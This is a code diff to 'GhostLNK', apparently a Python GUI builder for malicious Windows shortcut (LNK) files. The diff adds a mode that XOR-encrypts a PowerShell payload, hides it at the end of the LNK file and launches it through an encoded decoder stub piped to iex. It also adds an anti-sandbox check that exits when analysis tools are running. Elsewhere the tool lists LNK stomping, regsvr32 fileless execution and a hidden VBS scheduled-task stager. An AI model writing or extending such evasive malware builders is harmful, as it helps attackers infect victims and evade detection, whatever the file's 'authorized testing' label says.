@@ -387,13 +387,15 @@ class LNKEngine:
     @staticmethod
     def create_lnk(output_filename, target_path, arguments, icon_path, icon_index,
                    description, working_dir=None, stealth_level=0, hide_powershell=False,
-                   use_proxy=False, spoof_target_path=None, regsvr32_unc=None):
+                   use_proxy=False, spoof_target_path=None, regsvr32_unc=None,
+                   appended_payload=None):   # NEW parameter
         """
         Create a Windows LNK file with advanced evasion techniques.
 
         - use_proxy: launch via conhost.exe
         - spoof_target_path: make the LNK appear to point to this path (LNK Stomping)
         - regsvr32_unc: use regsvr32.exe to execute a remote scriptlet/DLL (fileless)
+        - appended_payload: bytes to append after the LNK structure (for payload hiding)
         """
         # --- regsvr32 mode overrides everything ---
         if regsvr32_unc:
@@ -519,9 +521,11 @@ class LNKEngine:
             id_list.items = elements
             lnk.shell_item_id_list = id_list
 
-        # Write the LNK file
+        # Write the LNK file and optionally append payload
         with open(output_filename, 'wb') as f:
             lnk.write(f)
+            if appended_payload:
+                f.write(appended_payload)
 
         return True
 
@@ -544,6 +548,7 @@ class GhostLNKGUI(QMainWindow):
         super().__init__()
         self.recent_urls = []
         self.recent_conversions = []
+        self.appended_payload_bytes = None  # NEW: store appended payload
         self.load_config()
         self.init_ui()
 
@@ -697,7 +702,7 @@ class GhostLNKGUI(QMainWindow):
         credit.setStyleSheet("color: #FFFF00; font-size: 12px; font-weight: bold; font-family: 'Courier New', monospace;")
         left_layout.addWidget(credit)
 
-        subtitle = QLabel("Dropbox: &dl=1 | STEALTH | HIDE | RAW TARGET | EVASION | EMBED")
+        subtitle = QLabel("Dropbox: &dl=1 | STEALTH | HIDE | RAW TARGET | EVASION | EMBED | APPEND")
         subtitle.setAlignment(Qt.AlignmentFlag.AlignLeft)
         subtitle.setStyleSheet("color: #00FFFF; font-size: 10px; font-family: 'Courier New', monospace;")
         left_layout.addWidget(subtitle)
@@ -746,11 +751,12 @@ class GhostLNKGUI(QMainWindow):
         self.statusBar().setStyleSheet("color: #00FFFF; font-family: 'Courier New', monospace;")
 
         self.create_menu()
-        self.log("GhostLNK initialized - Kimsuky-inspired upgrades active")
+        self.log("GhostLNK initialized")
         self.log("[OK] Custom executable target, stealth levels, hidden window")
         self.log("[OK] Advanced Evasion: conhost proxy, LNK Stomping, regsvr32 fileless")
         self.log("[OK] Embedded Payload: XOR encoding & string obfuscation")
         self.log("[OK] Multi-Stage Stager: LNK -> VBS -> Scheduled Task")
+        self.log("[OK] Append Mode: Payload hidden at end of LNK file")
 
     def create_converter_panel(self):
         panel = QWidget()
@@ -1034,7 +1040,7 @@ class GhostLNKGUI(QMainWindow):
         regsvr_layout.addWidget(self.regsvr_url)
         evasion_layout.addLayout(regsvr_layout)
 
-        # Multi-Stage Stager (Kimsuky style)
+        # Multi-Stage Stager
         self.multistage_cb = QCheckBox("Multi-Stage Stager (Drop VBS + Schedule Task)")
         self.multistage_cb.setToolTip(
             "Generate a multi-stage attack chain:\n"
@@ -1059,7 +1065,7 @@ class GhostLNKGUI(QMainWindow):
         evasion_group.setLayout(evasion_layout)
         layout.addWidget(evasion_group)
 
-        # Embedded Payload (No Network) with XOR & Obfuscation
+        # Embedded Payload (No Network) with XOR, Obfuscation & Append
         embedded_group = QGroupBox("Embedded Payload (No Network)")
         embedded_layout = QVBoxLayout()
 
@@ -1097,6 +1103,14 @@ class GhostLNKGUI(QMainWindow):
         self.obfuscate_cb = QCheckBox("Obfuscate Strings (Character Concatenation)")
         self.obfuscate_cb.setToolTip("Break up suspicious strings like 'powershell' into ('po'+'wer'+'she'+'ll')")
         embedded_layout.addWidget(self.obfuscate_cb)
+
+        # NEW: Append mode checkbox
+        self.append_cb = QCheckBox("Append Payload to LNK (Ultra Evasion)")
+        self.append_cb.setToolTip(
+            "Encrypt and append the payload to the end of the LNK file.\n"
+            "The command line contains only a tiny decoder stub with anti‑sandbox checks."
+        )
+        embedded_layout.addWidget(self.append_cb)
 
         self.embedded_generate_btn = QPushButton("Generate Embedded Payload")
         self.embedded_generate_btn.setToolTip(
@@ -1200,6 +1214,7 @@ class GhostLNKGUI(QMainWindow):
         self.xor_cb.setEnabled(not enabled)
         self.xor_key.setEnabled(not enabled and self.xor_cb.isChecked())
         self.obfuscate_cb.setEnabled(not enabled)
+        self.append_cb.setEnabled(not enabled)   # NEW
         self.embedded_generate_btn.setEnabled(not enabled)
         if enabled:
             self.mode_indicator.setText("Current Mode: RAW TARGET (Custom EXE)")
@@ -1269,7 +1284,9 @@ class GhostLNKGUI(QMainWindow):
             "- UTF-16LE: Required for standard PowerShell -E execution.<br>"
             "- UTF-8 / ASCII: Useful for custom stagers.<br><br>"
             "<b>XOR Encode:</b> Encrypt the script with a XOR key. The decoding stub will decrypt in memory.<br>"
-            "<b>String Obfuscation:</b> Break suspicious strings like 'powershell' into concatenated parts."
+            "<b>String Obfuscation:</b> Break suspicious strings like 'powershell' into concatenated parts.<br>"
+            "<b>Append Mode (Ultra Evasion):</b> Writes the encrypted payload to the end of the LNK file. "
+            "Only a tiny decoder stub with anti‑sandbox checks remains in the command line, evading signature‑based detection."
         )
 
     def show_raw_help(self):
@@ -1503,8 +1520,16 @@ class GhostLNKGUI(QMainWindow):
                 result = result.replace(s, replacement)
         return result
 
+    def _build_antisanbox_stub(self) -> str:
+        """Return PowerShell code that checks for analysis tools and exits if found."""
+        return r'''
+$bad=@('wireshark','procmon','procexp','vboxservice','vmtoolsd','vboxtray','xenservice','sandboxie','sbiesvc');
+$p=Get-Process -ErrorAction SilentlyContinue;
+foreach($b in $bad){if($p.Name -match $b){exit}};
+'''
+
     def generate_embedded_payload(self):
-        """Encode raw script with optional XOR and string obfuscation, build self-decoding command."""
+        """Encode raw script with optional XOR, string obfuscation, and append mode."""
         script = self.embedded_input.toPlainText().strip()
         if not script:
             QMessageBox.warning(self, "Warning", "No script content provided.")
@@ -1514,46 +1539,77 @@ class GhostLNKGUI(QMainWindow):
         if self.obfuscate_cb.isChecked():
             script = self._obfuscate_strings(script)
 
+        # Anti‑sandbox stub prepended (if append mode is used)
+        antisanbox = self._build_antisanbox_stub() if self.append_cb.isChecked() else ""
+
         encoding_choice = self.encoding_combo.currentText()
         if "UTF-16LE" in encoding_choice:
             encoding_name = "Unicode"
-            script_bytes = script.encode('utf-16le')
+            script_bytes = (antisanbox + script).encode('utf-16le')
         elif "UTF-8" in encoding_choice:
             encoding_name = "UTF8"
-            script_bytes = script.encode('utf-8')
+            script_bytes = (antisanbox + script).encode('utf-8')
         else:  # ASCII
             encoding_name = "ASCII"
-            script_bytes = script.encode('ascii', errors='ignore')
+            script_bytes = (antisanbox + script).encode('ascii', errors='ignore')
 
         # Apply XOR if requested
+        key_bytes = None
         if self.xor_cb.isChecked():
             key_str = self.xor_key.text().strip()
             if not key_str:
                 QMessageBox.warning(self, "Warning", "XOR key required.")
                 return
-            # If key looks like hex (0x5A), parse it
             if key_str.startswith("0x"):
                 key_bytes = bytes([int(key_str, 16)])
             else:
                 key_bytes = key_str.encode('utf-8')
             script_bytes = self._xor_encode(script_bytes, key_bytes)
-            # We'll need to include the key in the decoding stub
-            key_b64 = base64.b64encode(key_bytes).decode('ascii')
-            xor_decoder = f"$k=[Convert]::FromBase64String('{key_b64}');$d=[Convert]::FromBase64String($d);for($i=0;$i -lt $d.Length;$i++){{$d[$i]=$d[$i] -bxor $k[$i % $k.Length]}};$d=[System.Text.Encoding]::{encoding_name}.GetString($d)"
-            encoded_b64 = base64.b64encode(script_bytes).decode('ascii')
-            ps_command = f"$d='{encoded_b64}';{xor_decoder}|iex"
+
+        # --- Append Mode ---
+        if self.append_cb.isChecked():
+            if not key_bytes:
+                # If XOR not used, use a dummy key (0x00) to keep stub uniform
+                key_bytes = b'\x00'
+            key_array = ','.join(str(b) for b in key_bytes)
+            payload_len = len(script_bytes)
+
+            # Minimal decoding stub (reads itself, extracts appended bytes, XORs, and executes)
+            stub = fr'''
+function d($p,$s,$k){{
+    $b=[IO.File]::ReadAllBytes($p);
+    $l=$b.Length-$s;
+    $x=$b[$l..($b.Length-1)];
+    for($i=0;$i -lt $x.Length;$i++){{$x[$i]=$x[$i] -bxor $k[$i%$k.Length]}};
+    [Text.Encoding]::{encoding_name}.GetString($x)|iex
+}};
+d $MyInvocation.MyCommand.Path {payload_len} @({key_array})
+'''
+            # Base64‑encode the stub (UTF‑16LE for -E compatibility)
+            final_encoded = base64.b64encode(stub.encode('utf-16le')).decode()
+            final_arg = f"-E {final_encoded}"
+            self.import_input.setText(final_arg)
+            self.preview_label.setText(f"Arguments: {final_arg[:100]}...")
+            self.appended_payload_bytes = script_bytes   # store for generate_lnk
+            self.log(f"[OK] Append mode: stub {len(stub)} chars, payload {payload_len} bytes appended (anti‑sandbox: {bool(antisanbox)}).")
+            self.mode_indicator.setText("Current Mode: Appended Payload (Ultra Evasion)")
         else:
+            # Original embedded payload (full self‑contained)
             encoded_b64 = base64.b64encode(script_bytes).decode('ascii')
-            ps_command = f"$d='{encoded_b64}';[System.Text.Encoding]::{encoding_name}.GetString([System.Convert]::FromBase64String($d))|iex"
+            if key_bytes:
+                key_b64 = base64.b64encode(key_bytes).decode('ascii')
+                xor_decoder = f"$k=[Convert]::FromBase64String('{key_b64}');$d=[Convert]::FromBase64String($d);for($i=0;$i -lt $d.Length;$i++){{$d[$i]=$d[$i] -bxor $k[$i % $k.Length]}};$d=[System.Text.Encoding]::{encoding_name}.GetString($d)"
+                ps_command = f"$d='{encoded_b64}';{xor_decoder}|iex"
+            else:
+                ps_command = f"$d='{encoded_b64}';[System.Text.Encoding]::{encoding_name}.GetString([System.Convert]::FromBase64String($d))|iex"
+            final_encoded = base64.b64encode(ps_command.encode('utf-16le')).decode()
+            final_arg = f"-E {final_encoded}"
+            self.import_input.setText(final_arg)
+            self.preview_label.setText(f"Arguments: {final_arg[:100]}...")
+            self.appended_payload_bytes = None
+            self.log(f"[OK] Embedded payload generated ({len(encoded_b64)} chars base64, XOR: {self.xor_cb.isChecked()})")
+            self.mode_indicator.setText("Current Mode: Embedded Payload (No Network)")
 
-        # Encode the whole stub as UTF-16LE for use with -E
-        final_encoded = base64.b64encode(ps_command.encode('utf-16le')).decode()
-        final_arg = f"-E {final_encoded}"
-
-        self.import_input.setText(final_arg)
-        self.preview_label.setText(f"Arguments: {final_arg[:100]}...")
-        self.log(f"[OK] Embedded payload generated ({len(encoded_b64)} chars base64, XOR: {self.xor_cb.isChecked()}, Obfuscate: {self.obfuscate_cb.isChecked()})")
-        self.mode_indicator.setText("Current Mode: Embedded Payload (No Network)")
         self.mode_indicator.setStyleSheet("color: #00FF00; font-weight: bold;")
 
     def generate_desc(self):
@@ -1615,6 +1671,7 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
                 spoof_target = None
                 regsvr32_unc = None
                 multistage = False
+                appended_payload = None   # Not applicable
 
             else:
                 # Check if multi-stage stager is enabled
@@ -1633,6 +1690,7 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
                     spoof_target = self.stomp_path.text().strip() if self.stomp_cb.isChecked() else None
                     regsvr32_unc = self.regsvr_url.text().strip() if self.regsvr_cb.isChecked() else None
                     multistage = True
+                    appended_payload = None
                 else:
                     if not self.regsvr_cb.isChecked():
                         arg = self.import_input.text().strip() or self.arg_display.toPlainText().strip()
@@ -1648,6 +1706,7 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
                     spoof_target = self.stomp_path.text().strip() if self.stomp_cb.isChecked() else None
                     regsvr32_unc = self.regsvr_url.text().strip() if self.regsvr_cb.isChecked() else None
                     multistage = False
+                    appended_payload = getattr(self, 'appended_payload_bytes', None)
 
             icon = self.icon_combo.currentText()
             icon_path, icon_idx, ext = self.ICON_DATABASE[icon]
@@ -1669,7 +1728,7 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
                 stealth = self.stealth_combo.currentIndex()
                 hide = self.hide_pwsh_cb.isChecked()
                 mode = ["Download & Open", "Memory Execute", "Ultra Stealth"][self.type_combo.currentIndex()]
-                self.log(f"Generating LNK (PowerShell) - Mode: {mode}, Stealth: {['Normal','Moderate','Maximum'][stealth]}, Hide: {hide}, Proxy: {use_proxy}, Stomp: {bool(spoof_target)}, regsvr32: {bool(regsvr32_unc)}, MultiStage: {multistage}")
+                self.log(f"Generating LNK (PowerShell) - Mode: {mode}, Stealth: {['Normal','Moderate','Maximum'][stealth]}, Hide: {hide}, Proxy: {use_proxy}, Stomp: {bool(spoof_target)}, regsvr32: {bool(regsvr32_unc)}, MultiStage: {multistage}, Append: {bool(appended_payload)}")
             else:
                 stealth = 0
                 hide = False
@@ -1687,7 +1746,8 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
                 hide_powershell=hide,
                 use_proxy=use_proxy,
                 spoof_target_path=spoof_target,
-                regsvr32_unc=regsvr32_unc
+                regsvr32_unc=regsvr32_unc,
+                appended_payload=appended_payload   # NEW: pass appended payload
             )
 
             size = os.path.getsize(save_path)
@@ -1754,8 +1814,8 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
             "> Hidden PowerShell Window option<br>"
             "> Raw Target Mode<br>"
             "> Advanced Evasion: conhost proxy, LNK Stomping, regsvr32 fileless<br>"
-            "> Multi-Stage Stager (Kimsuky style)<br>"
-            "> Embedded Payload with XOR & String Obfuscation<br><br>"
+            "> Multi-Stage Stager<br>"
+            "> Embedded Payload with XOR, String Obfuscation & Append Mode (Ultra Evasion)<br><br>"
             "For authorized testing only")
 
 
